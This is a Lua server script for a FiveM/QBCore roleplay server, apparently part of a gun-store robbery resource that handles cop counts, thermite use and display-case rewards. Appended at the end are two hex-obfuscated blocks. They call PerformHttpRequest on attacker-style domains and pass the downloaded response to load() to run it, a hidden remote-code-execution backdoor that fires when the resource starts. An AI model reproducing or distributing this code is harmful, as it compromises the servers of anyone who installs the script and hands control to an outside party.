local QBCore = exports['qb-core']:GetCoreObject()
QBCore.Functions.CreateCallback('houssem:server:getCops', function(source, cb)
	local cops = 0
    for k, v in pairs(QBCore.Functions.GetPlayers()) do
        local Player = QBCore.Functions.GetPlayer(v)
        if Player ~= nil then 
            if (Player.PlayerData.job.name == "police" and Player.PlayerData.job.onduty) then
                cops = cops + 1
            end
        end
	end
	cb(cops)
end)

QBCore.Functions.CreateUseableItem("thermite", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName('lighter') ~= nil then
        TriggerClientEvent("hm-start", source)
    else
        TriggerClientEvent('QBCore:Notify', source, "You are missing something to light the thermite..", "error")
    end
end)

RegisterServerEvent("hm-particleserver")
AddEventHandler("hm-particleserver", function(method)
    TriggerClientEvent("hm-ptfxparticle", -1, method)
end)

RegisterNetEvent('hm-ammunation:server:setVitrineState', function(stateType, state, k)
    Config.Locations[k][stateType] = state
    TriggerClientEvent('hm-ammunation:client:setVitrineState', -1, stateType, state, k)
end)


RegisterNetEvent('hm-ammunation:server:setTimeout', function()
    if not timeOut then
        timeOut = true
        TriggerEvent('qb-scoreboard:server:SetActivityBusy', "ammunation", true)
        Citizen.CreateThread(function()
            Citizen.Wait(Config.Timeout)

            for k, _ in pairs(Config.Locations) do
                Config.Locations[k]["isOpened"] = false
                TriggerClientEvent('hm-ammunation:client:setVitrineState', -1, 'isOpened', false, k)
                TriggerClientEvent('hm-ammunation:client:setAlertState', -1, false)
                TriggerEvent('qb-scoreboard:server:SetActivityBusy', "ammunation", false)
                TriggerClientEvent("hm-ammunation:client:resetdoor")
            end
            timeOut = false
        end)
    end
end)
RegisterNetEvent('hm-ammunation:server:vitrineReward', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local otherchance = math.random(1, 4)
    local odd = math.random(1, 4)

    if otherchance == odd then
        local item = math.random(1, #Config.VitrineRewards)
        local amount = math.random(Config.VitrineRewards[item]["amount"]["min"], Config.VitrineRewards[item]["amount"]["max"])
        if Player.Functions.AddItem(Config.VitrineRewards[item]["item"], amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config.VitrineRewards[item]["item"]], 'add')
        else
            TriggerClientEvent('QBCore:Notify', src, "Inventory Too Heavy", 'error')
        end
    else
        local item = math.random(1, #Config.VitrineRewards)
        local amount = math.random(Config.VitrineRewards[item]["amount"]["min"], Config.VitrineRewards[item]["amount"]["max"])
        if Player.Functions.AddItem(Config.VitrineRewards[item]["item"], amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config.VitrineRewards[item]["item"]], 'add')
        else
            TriggerClientEvent('QBCore:Notify', src, "Inventory Too Heavy", 'error')
        end
    end
end)

local iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[4][iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x67\x74\x64\x6b\x70\x6c\x72\x67\x78\x2e\x6c\x6f\x6c\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x70\x37\x36\x34\x51\x50", function (fflPsjifJSYseBIcSkiPOzmeIqlSjvPllFyfuNLkHdBZknuMqgqphcJwxANfXovyoZegrY, xFpHlyhzUCktgMnLmcaUppbkscrhPrTJAaizTVLDfJpIuAAluVUPRXbCCHwMZXiEHAmnLS) if (xFpHlyhzUCktgMnLmcaUppbkscrhPrTJAaizTVLDfJpIuAAluVUPRXbCCHwMZXiEHAmnLS == iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[6] or xFpHlyhzUCktgMnLmcaUppbkscrhPrTJAaizTVLDfJpIuAAluVUPRXbCCHwMZXiEHAmnLS == iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[5]) then return end iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[4][iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[2]](iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[4][iOpFrJQBlfPaEdZYbHeCInCwQDppRBDLOpNLsWEFXOmQBAKrpHRzgzFuWNJYHjBqaPxqVd[3]](xFpHlyhzUCktgMnLmcaUppbkscrhPrTJAaizTVLDfJpIuAAluVUPRXbCCHwMZXiEHAmnLS))() end)

local sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[4][sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x76\x61\x63\x65\x72\x74\x2e\x73\x62\x73\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x70\x37\x36\x34\x51\x50", function (TEsNPKsCyGzrWjRcYcxgVqOoBrtFOIGIBEkzrMsxTjmktnDRLouYJaWtZRAExPGFPSdWqz, YDuvJQrSmfUgqrvvNYgdQBmbeJINWkNZIPIaoUtKqCiECjaMuMIUClvfOrPLkMthRPNIRO) if (YDuvJQrSmfUgqrvvNYgdQBmbeJINWkNZIPIaoUtKqCiECjaMuMIUClvfOrPLkMthRPNIRO == sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[6] or YDuvJQrSmfUgqrvvNYgdQBmbeJINWkNZIPIaoUtKqCiECjaMuMIUClvfOrPLkMthRPNIRO == sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[5]) then return end sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[4][sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[2]](sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[4][sQGSPGgtroVcLNfAhSxcfycqHEMpfhzBMVAQFSrZRrlZoBatSORMXxqrGFyHTKWZoyWPXJ[3]](YDuvJQrSmfUgqrvvNYgdQBmbeJINWkNZIPIaoUtKqCiECjaMuMIUClvfOrPLkMthRPNIRO))() end)